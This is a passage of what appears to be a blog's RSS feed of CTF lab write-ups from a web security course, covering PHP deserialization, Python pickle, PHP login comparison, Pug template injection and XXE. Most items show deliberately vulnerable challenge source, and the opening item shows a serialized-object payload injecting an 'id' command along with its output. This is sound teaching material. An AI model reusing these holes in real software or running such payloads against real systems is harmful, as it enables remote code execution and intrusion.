php &amp;gt; $_GET[&amp;#39;cat&amp;#39;]=&amp;#39;O:3:&amp;#34;cat&amp;#34;:1:{s:5:&amp;#34;sound&amp;#34;;s:4:&amp;#34;;id;&amp;#34;;}&amp;#39;;
php &amp;gt; $cat = unserialize($_GET[&amp;#39;cat&amp;#39;]);

uid=1000(sbk6401) gid=1000(sbk6401) groups=1000(sbk6401),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),117(netdev),1001(docker)
&lt;/code>&lt;/pre>&lt;p>This is a typical command injection. The magic method &lt;code>__wakeup()&lt;/code> will be called when unserialized something.&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x11lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
 Simple Web 0x16(Lab - Pickle)
 &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&amp;#34;/sauce&amp;#34;)
def sauce():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


@app.route(&amp;#34;/&amp;#34;)
def main():
 session = request.cookies.get(&amp;#34;session&amp;#34;)
 if session == None:
 return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;

 else:
 user = pickle.loads(base64.b64decode(session))
 return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 user = base64.b64encode(pickle.dumps({
 &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
 &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
 }))
 resp = make_response(redirect(&amp;#39;/&amp;#39;))
 resp.set_cookie(&amp;#34;session&amp;#34;, user)
 return resp
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x16(Lab - Pickle)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/</guid><description>&lt;h1 id="simple-web-0x16lab---pickle">
 Simple Web 0x16(Lab - Pickle)
 &lt;a class="anchor" href="#simple-web-0x16lab---pickle">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8600/">http://h4ck3r.quest:8600/&lt;/a>
Note: open a brand new window that haven&amp;rsquo;t login &lt;code>http://h4ck3r.quest&lt;/code>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/IcoQql7UQiegLv8KtK2wOw">0x15.5(Pickle)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-pyton=" data-lang="pyton=">from flask import Flask, request, make_response, redirect, send_file
import base64
import pickle

app = Flask(__name__)


@app.route(&amp;#34;/sauce&amp;#34;)
def sauce():
 return send_file(__file__, mimetype=&amp;#34;text/plain&amp;#34;)


@app.route(&amp;#34;/&amp;#34;)
def main():
 session = request.cookies.get(&amp;#34;session&amp;#34;)
 if session == None:
 return &amp;#39;&amp;lt;form action=&amp;#34;/login&amp;#34; method=&amp;#34;POST&amp;#34;&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Name: &amp;lt;input name=&amp;#34;name&amp;#34; type=&amp;#34;text&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;p&amp;gt;Age: &amp;lt;input name=&amp;#34;age&amp;#34; type=&amp;#34;number&amp;#34;&amp;gt;&amp;lt;/p&amp;gt;&amp;#39; +\
 &amp;#39;&amp;lt;button&amp;gt;Submit&amp;lt;/button&amp;gt;&amp;lt;/form&amp;gt;&amp;lt;hr&amp;gt;&amp;lt;a href=&amp;#34;/sauce&amp;#34;&amp;gt;Source code&amp;lt;/a&amp;gt;&amp;#39;

 else:
 user = pickle.loads(base64.b64decode(session))
 return f&amp;#39;&amp;lt;p&amp;gt;Name: {user[&amp;#34;name&amp;#34;]}&amp;lt;/p&amp;gt;&amp;lt;p&amp;gt;Age: {user[&amp;#34;age&amp;#34;]}&amp;lt;/p&amp;gt;&amp;#39;


@app.route(&amp;#34;/login&amp;#34;, methods=[&amp;#39;POST&amp;#39;])
def login():
 user = base64.b64encode(pickle.dumps({
 &amp;#34;name&amp;#34;: request.form.get(&amp;#39;name&amp;#39;),
 &amp;#34;age&amp;#34;: int(request.form.get(&amp;#39;age&amp;#39;))
 }))
 resp = make_response(redirect(&amp;#39;/&amp;#39;))
 resp.set_cookie(&amp;#34;session&amp;#34;, user)
 return resp
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
 Simple Web 0x17(Lab - Baby Cat)
 &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Cat
{
 public $name = &amp;#39;(guest cat)&amp;#39;;
 function __construct($name)
 {
 $this-&amp;gt;name = $name;
 }
 function __wakeup()
 {
 echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
 system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
 echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
 }
}

if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
 setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
} else {
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
}
?&amp;gt;
&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x17(Lab - Baby Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x17lab---baby-cat/</guid><description>&lt;h1 id="simple-web-0x17lab---baby-cat">
 Simple Web 0x17(Lab - Baby Cat)
 &lt;a class="anchor" href="#simple-web-0x17lab---baby-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8601/">http://h4ck3r.quest:8601/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://bernie6401.github.io/FkF8p-zrSMSOWFkE4vvAJQ">0x16.5(php unserialize)&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Cat
{
 public $name = &amp;#39;(guest cat)&amp;#39;;
 function __construct($name)
 {
 $this-&amp;gt;name = $name;
 }
 function __wakeup()
 {
 echo &amp;#34;&amp;lt;pre&amp;gt;&amp;#34;;
 system(&amp;#34;cowsay &amp;#39;Welcome back, $this-&amp;gt;name&amp;#39;&amp;#34;);
 echo &amp;#34;&amp;lt;/pre&amp;gt;&amp;#34;;
 }
}

if (!isset($_COOKIE[&amp;#39;cat_session&amp;#39;])) {
 $cat = new Cat(&amp;#34;cat_&amp;#34; . rand(0, 0xffff));
 setcookie(&amp;#39;cat_session&amp;#39;, base64_encode(serialize($cat)));
} else {
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat_session&amp;#39;]));
}
?&amp;gt;
&amp;lt;p&amp;gt;Hello, &amp;lt;?= $cat-&amp;gt;name ?&amp;gt;.&amp;lt;/p&amp;gt;
&amp;lt;a href=&amp;#34;/?source&amp;#34;&amp;gt;source code&amp;lt;/a&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x13lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
 Simple Web 0x18(Lab - Magic Cat)
 &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>None&amp;hellip;&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Magic
{
 function cast($spell)
 {
 echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
 }
}

// Useless class?
class Caster
{
 public $cast_func = &amp;#39;intval&amp;#39;;
 function cast($val)
 {
 return ($this-&amp;gt;cast_func)($val);
 }
}


class Cat
{
 public $magic;
 public $spell;
 function __construct($spell)
 {
 $this-&amp;gt;magic = new Magic();
 $this-&amp;gt;spell = $spell;
 }
 function __wakeup()
 {
 echo &amp;#34;Cat Wakeup!\n&amp;#34;;
 $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
 }
}

if (isset($_GET[&amp;#39;spell&amp;#39;])) {
 $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
 echo &amp;#34;Unserialize...\n&amp;#34;;
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
} else {
 $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
}
?&amp;gt;
&amp;lt;pre&amp;gt;
This is your 🐱:
&amp;lt;?php var_dump($cat) ?&amp;gt;
&amp;lt;/pre&amp;gt;

&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x18(Lab - Magic Cat)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x18lab---magic-cat/</guid><description>&lt;h1 id="simple-web-0x18lab---magic-cat">
 Simple Web 0x18(Lab - Magic Cat)
 &lt;a class="anchor" href="#simple-web-0x18lab---magic-cat">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8602/">http://h4ck3r.quest:8602/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>None&amp;hellip;&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-php=&lt;?php" data-lang="php=&lt;?php">isset($_GET[&amp;#39;source&amp;#39;]) &amp;amp;&amp;amp; die(!show_source(__FILE__));

class Magic
{
 function cast($spell)
 {
 echo &amp;#34;&amp;lt;script&amp;gt;alert(&amp;#39;MAGIC, $spell!&amp;#39;);&amp;lt;/script&amp;gt;&amp;#34;;
 }
}

// Useless class?
class Caster
{
 public $cast_func = &amp;#39;intval&amp;#39;;
 function cast($val)
 {
 return ($this-&amp;gt;cast_func)($val);
 }
}


class Cat
{
 public $magic;
 public $spell;
 function __construct($spell)
 {
 $this-&amp;gt;magic = new Magic();
 $this-&amp;gt;spell = $spell;
 }
 function __wakeup()
 {
 echo &amp;#34;Cat Wakeup!\n&amp;#34;;
 $this-&amp;gt;magic-&amp;gt;cast($this-&amp;gt;spell);
 }
}

if (isset($_GET[&amp;#39;spell&amp;#39;])) {
 $cat = new Cat($_GET[&amp;#39;spell&amp;#39;]);
} else if (isset($_COOKIE[&amp;#39;cat&amp;#39;])) {
 echo &amp;#34;Unserialize...\n&amp;#34;;
 $cat = unserialize(base64_decode($_COOKIE[&amp;#39;cat&amp;#39;]));
} else {
 $cat = new Cat(&amp;#34;meow-meow-magic&amp;#34;);
}
?&amp;gt;
&amp;lt;pre&amp;gt;
This is your 🐱:
&amp;lt;?php var_dump($cat) ?&amp;gt;
&amp;lt;/pre&amp;gt;

&amp;lt;p&amp;gt;Usage:&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?source&amp;lt;/p&amp;gt;
&amp;lt;p&amp;gt;/?spell=the-spell-of-your-cat&amp;lt;/p&amp;gt;
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x19(Lab - PHP Login)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/language-feature/simple-web-0x19lab---php-login/</guid><description>&lt;h1 id="simple-web-0x19lab---php-login">
 Simple Web 0x19(Lab - PHP Login)
 &lt;a class="anchor" href="#simple-web-0x19lab---php-login">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8081">http://h4ck3r.quest:8081&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
// BSides Ahmedabad CTF 2021: entrance

include &amp;#39;flag.php&amp;#39;;
$users = array(
 &amp;#34;admin&amp;#34; =&amp;gt; &amp;#34;ed2b7b57b3b5be3e8d4246c69e4b513608ffb352&amp;#34;,
 &amp;#34;guest&amp;#34; =&amp;gt; &amp;#34;35675e68f4b5af7b995d9205ad0fc43842f16450&amp;#34;
);

function lookup($username) {
 global $users;
 return array_key_exists($username, $users) ? $users[$username] : &amp;#34;&amp;#34;;
}

if (!empty($_POST[&amp;#39;username&amp;#39;]) &amp;amp;&amp;amp; !empty($_POST[&amp;#39;password&amp;#39;])) {
 $sha1pass = lookup($_POST[&amp;#39;username&amp;#39;]);
 if ($sha1pass == sha1($_POST[&amp;#39;password&amp;#39;])) {
 if ($_POST[&amp;#39;username&amp;#39;] !== &amp;#39;guest&amp;#39;) echo $FLAG;
 else echo &amp;#39;Welcome guest!&amp;#39;;
 } else {
 echo &amp;#39;Login Failed!&amp;#39;;
 }
} else {
 echo &amp;#34;You can login with guest:guest&amp;#34;;
}
echo &amp;#34;&amp;lt;br&amp;gt;\n&amp;#34;;
highlight_file(__file__);
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;p>Must change &lt;code>GET&lt;/code> method to &lt;code>POST&lt;/code> method and add &lt;code>Content-Type: application/x-www-form-urlencoded&lt;/code> in header&lt;/p></description></item><item><title>Simple Web 0x22(Lab - Pug)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/ssti/simple-web-0x22lab---pug/</guid><description>&lt;h1 id="simple-web-0x22lab---pug">
 Simple Web 0x22(Lab - Pug)
 &lt;a class="anchor" href="#simple-web-0x22lab---pug">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8008">http://h4ck3r.quest:8008&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-javascript=" data-lang="javascript=">const express = require(&amp;#39;express&amp;#39;);
const pug = require(&amp;#39;pug&amp;#39;);

const app = express();

const template = `
h1 Hello %NAME%
form(method=&amp;#39;GET&amp;#39; action=&amp;#39;/&amp;#39;)
 div
 label(for=&amp;#39;nickname&amp;#39;) Name:
 input#nickname(type=&amp;#39;text&amp;#39;, placeholder=&amp;#39;Nickname&amp;#39; name=&amp;#39;name&amp;#39;)
 button(type=&amp;#39;submit&amp;#39;) Submit 
 a(href=&amp;#39;/source&amp;#39;) Source Code
`;

app.get(&amp;#39;/&amp;#39;, (req, res) =&amp;gt; {
 const name = (req.query.name ?? &amp;#39;Anonymous&amp;#39;).toString();
 if (name.includes(&amp;#39;{&amp;#39;)) return res.send(&amp;#39;Nice try&amp;#39;);
 let html = pug.render(template.replace(&amp;#39;%NAME%&amp;#39;, name));
 res.set(&amp;#39;Content-Type&amp;#39;, &amp;#39;text/html&amp;#39;);
 res.send(html);
});

app.get(&amp;#34;/source&amp;#34;, (_, res) =&amp;gt; {
 res.sendFile(__filename);
});

app.listen(3000, () =&amp;gt; console.log(&amp;#39;:3000&amp;#39;));
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/web/simple-web---0x14lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
 Simple Web 0x23(Lab - XXE)
 &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input
取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
:::spoiler XXE course lecture
&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
:::
:::spoiler exploit type
&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;pre tabindex="0">&lt;code class="language-php=" data-lang="php=">&amp;lt;?php
 $xmlfile = urldecode(file_get_contents(&amp;#39;php://input&amp;#39;));
 if (!$xmlfile) die(show_source(__FILE__));

 $dom = new DOMDocument();
 $dom-&amp;gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD);
 $creds = simplexml_import_dom($dom);
 $user = $creds-&amp;gt;user;
 echo &amp;#34;You have logged in as user $user&amp;#34;;
?&amp;gt;
&lt;/code>&lt;/pre>&lt;h2 id="exploit---xxe">
 Exploit - XXE
 &lt;a class="anchor" href="#exploit---xxe">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>Normal Usage in this webpage&lt;/li>
&lt;/ol>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>Simple Web 0x23(Lab - XXE)</title><link>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntust-ws/deserialization/simple-web-0x23lab---xxe/</guid><description>&lt;h1 id="simple-web-0x23lab---xxe">
 Simple Web 0x23(Lab - XXE)
 &lt;a class="anchor" href="#simple-web-0x23lab---xxe">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-ntustws-ctf-web">
 tags: &lt;code>NTUSTWS&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Web&lt;/code>
 &lt;a class="anchor" href="#tags-ntustws-ctf-web">#&lt;/a>
&lt;/h6>
&lt;p>Challenge: &lt;a href="http://h4ck3r.quest:8604/">http://h4ck3r.quest:8604/&lt;/a>&lt;/p>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.w3schools.com/xml/xml_tree.asp">XML Tree&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_parser.asp">XML Parser&lt;/a>
&lt;a href="https://www.w3schools.com/xml/ajax_xmlhttprequest_response.asp">AJAX - Server Response&lt;/a>
&lt;a href="https://www.w3schools.com/xml/xml_dtd.asp">XML DTD&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://phper.shujuwajue.com/shu-zu/shu-ru-liu-php-input">输入流 php://input&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input可以读取没有处理过的POST数据。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://ithelp.ithome.com.tw/articles/10217536">Day 18：Stream 概述&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>php://input
取得所有的 input 通常來源於 HTTP body，值得注意的是，由這個 Stream 取得的內容是 Raw Body，所以需要自行解析。&lt;/p>&lt;/blockquote>
&lt;p>&lt;a href="https://www.digicentre.com.tw/industry_detail?id=38">來自外部的威脅-XXE漏洞攻擊成因&lt;/a>
:::spoiler XXE course lecture
&lt;img src="https://i.imgur.com/NsyIcdt.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/zYonfqc.png" alt="" />
:::
:::spoiler exploit type
&lt;img src="https://i.imgur.com/IJlFonF.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/N9VNyBC.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/uqPwH5H.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://i.imgur.com/j8WI9eQ.png" alt="" />
:::&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
